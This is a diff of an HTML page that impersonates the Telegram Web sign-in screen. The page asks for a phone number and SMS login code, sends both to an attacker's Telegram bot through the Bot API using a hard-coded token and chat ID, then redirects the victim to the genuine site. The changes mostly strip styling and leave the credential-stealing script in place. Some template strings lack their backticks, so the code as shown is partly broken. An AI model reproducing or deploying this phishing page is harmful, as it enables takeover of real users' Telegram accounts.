@@ -2,7 +2,6 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Telegram Web</title>
     <style>
         * {
@@ -11,67 +10,37 @@
             box-sizing: border-box;
         }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: Arial, sans-serif;
             background: #0f0f0f;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-        }
-        .container {
-            max-width: 400px;
-            width: 100%;
         }
         .card {
             background: #1f1f1f;
             border-radius: 28px;
             padding: 32px 24px;
-            box-shadow: 0 12px 32px rgba(0,0,0,0.4);
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 28px;
-        }
-        .logo svg {
-            width: 56px;
-            height: 56px;
+            width: 350px;
         }
         h1 {
-            color: #ffffff;
-            font-size: 24px;
-            font-weight: 500;
+            color: white;
             text-align: center;
             margin-bottom: 8px;
         }
         .sub {
-            color: #8e8e8e;
+            color: gray;
             text-align: center;
-            font-size: 14px;
             margin-bottom: 32px;
-        }
-        .input-group {
-            margin-bottom: 16px;
-        }
-        label {
-            display: block;
-            color: #8e8e8e;
-            font-size: 14px;
-            margin-bottom: 6px;
         }
         input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 14px;
             background: #2b2b2b;
             border: 1px solid #3e3e3e;
             border-radius: 14px;
-            color: #ffffff;
-            font-size: 16px;
-            outline: none;
-        }
-        input:focus {
-            border-color: #2b9aff;
-            background: #333333;
+            color: white;
+            margin-bottom: 16px;
         }
         button {
             width: 100%;
@@ -80,96 +49,67 @@
             border: none;
             border-radius: 14px;
             color: white;
-            font-size: 16px;
-            font-weight: 600;
-            margin-top: 16px;
+            font-weight: bold;
             cursor: pointer;
         }
-        button:hover {
-            background: #1f8ae8;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #5e5e5e;
-        }
         .error {
-            background: rgba(255,60,60,0.2);
-            border: 1px solid #ff3c3c;
             color: #ff6b6b;
-            padding: 10px;
-            border-radius: 12px;
-            font-size: 13px;
             text-align: center;
             margin-bottom: 16px;
             display: none;
         }
+        .footer {
+            text-align: center;
+            color: gray;
+            font-size: 12px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="card">
-        <div class="logo">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.61.15-.15 2.71-2.48 2.76-2.69.01-.03.02-.14-.07-.2-.09-.06-.22-.04-.32-.01-.14.04-2.37 1.51-3.35 2.12-.32.21-.61.31-.87.31-.29 0-.58-.1-.85-.19-.35-.12-.63-.2-.96-.32-.38-.14-.68-.23-.66-.49.01-.15.22-.3.66-.46 2.58-1.12 4.3-1.86 5.16-2.23 2.46-1.04 2.97-1.22 3.3-1.22.07 0 .18.02.27.09.09.07.14.16.15.27.01.1 0 .2-.02.32z" fill="#2b9aff"/>
-            </svg>
-        </div>
-        <h1>Telegram</h1>
-        <div class="sub">Sign in to your account</div>
-        <div class="error" id="errorMsg"></div>
-        <form id="loginForm">
-            <div class="input-group">
-                <label>Phone number</label>
-                <input type="tel" id="phone" placeholder="+7 987 264 5334" value="">
-            </div>
-            <div class="input-group">
-                <label>Code from SMS</label>
-                <input type="text" id="code" placeholder="XXXXX">
-            </div>
-            <button type="submit">Next</button>
-        </form>
-        <div class="footer">Telegram Web</div>
-    </div>
+<div class="card">
+    <h1>Telegram</h1>
+    <div class="sub">Sign in to your account</div>
+    <div class="error" id="errorMsg"></div>
+    <input type="text" id="phone" placeholder="Phone number">
+    <input type="text" id="code" placeholder="Code from SMS">
+    <button id="sendBtn">Next</button>
+    <div class="footer">Telegram Web</div>
 </div>
 
 <script>
     const BOT_TOKEN = '8300626512:AAEH-ZR2FLuQkRhkF6WkRdgOsdhimjBL9IE';
     const CHAT_ID = '7110007728';
 
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const phone = document.getElementById('phone').value.trim();
-        const code = document.getElementById('code').value.trim();
+    document.getElementById('sendBtn').onclick = async function() {
+        const phone = document.getElementById('phone').value;
+        const code = document.getElementById('code').value;
         const errorDiv = document.getElementById('errorMsg');
         
         if (!phone || !code) {
-            errorDiv.textContent = 'Please fill in both fields';
+            errorDiv.textContent = 'Fill in both fields';
             errorDiv.style.display = 'block';
             return;
         }
         
         errorDiv.style.display = 'none';
-        
-        const message = 🔐 LOGIN\nPhone: ${phone}\nCode: ${code};
-        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)};
+        const text = Phone: ${phone} Code: ${code};
+        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
         
         try {
             const response = await fetch(url);
             const result = await response.json();
-            
             if (result.ok) {
                 window.location.href = 'https://web.telegram.org/z/';
             } else {
-                errorDiv.textContent = 'Error: ' + (result.description || 'Unknown error');
+                errorDiv.textContent = 'Error: ' + result.description;
                 errorDiv.style.display = 'block';
             }
-        } catch (err) {
-            errorDiv.textContent = 'Network error. Please try again.';
+        } catch(e) {
+            errorDiv.textContent = 'Network error';
             errorDiv.style.display = 'block';
         }
-    });
+    };
 </script>
 </body>
 </html>
